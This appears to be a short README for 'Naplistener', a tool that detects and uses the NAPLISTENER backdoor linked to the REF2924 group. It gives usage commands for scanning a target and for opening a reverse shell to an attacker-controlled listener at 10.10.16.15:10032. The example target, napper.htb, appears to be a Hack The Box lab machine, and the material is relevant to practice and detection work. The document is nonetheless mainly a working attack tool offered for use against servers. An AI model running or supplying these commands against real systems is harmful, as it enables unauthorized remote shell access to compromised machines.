

# NAPLISTENER

This is a backdoor scanner for the Wmdtc.exe backdoor associated with the REF2924 APT group.

We can use this tool on both Windows and Linux to scan target servers.


If you find the presence of the field [Microsoft HTTPAPI/2.0], you can try scanning the organization's backdoor.

When running the script for the first time, it will automatically help you download dependent files.

# SCAN

`$ python3 Naplistener.py -u "https://napper.htb"`

![image.png](https://image.3001.net/images/20240505/1714842391_66366b177af6ed100fcd4.png!small)

# Reverse Shell

`$ python3 Naplistener.py -u "https://napper.htb" -lh 10.10.16.15 -lp 10032`

![image.png](https://image.3001.net/images/20240505/1714842460_66366b5c52f4d6e8eed69.png!small)

![image.png](https://image.3001.net/images/20240505/1714842481_66366b7107e3b4577ca02.png!small)
